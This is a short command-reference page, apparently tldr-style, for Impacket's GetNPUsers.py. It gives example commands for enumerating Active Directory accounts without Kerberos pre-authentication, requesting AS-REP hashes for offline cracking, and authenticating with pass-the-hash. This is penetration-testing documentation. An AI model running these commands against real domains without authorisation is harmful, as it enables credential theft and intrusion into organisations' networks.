# getnpusers.py

> Enumerate Active Directory accounts with Kerberos pre-authentication disabled, which may be susceptible to AS-REP roasting attacks. Part of the Impacket suite. More information: <https://github.com/fortra/impacket>.

## Examples

### Enumerate users with Kerberos pre-authentication disabled (default anonymous enumeration)

```bash
GetNPUsers.py domain/ -usersfile path/to/userslist -dc-ip domain_controller_ip -no-pass
```

### Perform AS-REP roasting and dump crackable hashes for offline cracking

```bash
GetNPUsers.py domain/ -usersfile path/to/userslist -dc-ip domain_controller_ip -no-pass -request
```

### Authenticate with valid credentials (if anonymous binding is disabled)

```bash
GetNPUsers.py domain/username:password -usersfile path/to/userslist -dc-ip domain_controller_ip
```

### Use pass-the-hash authentication instead of a password

```bash
GetNPUsers.py domain/username -hashes LM_Hash:NT_Hash -usersfile path/to/userslist -dc-ip domain_controller_ip
```

### Save the output to a file for further analysis

```bash
GetNPUsers.py domain/ -usersfile path/to/userslist -dc-ip domain_controller_ip -request > path/to/output.txt
```
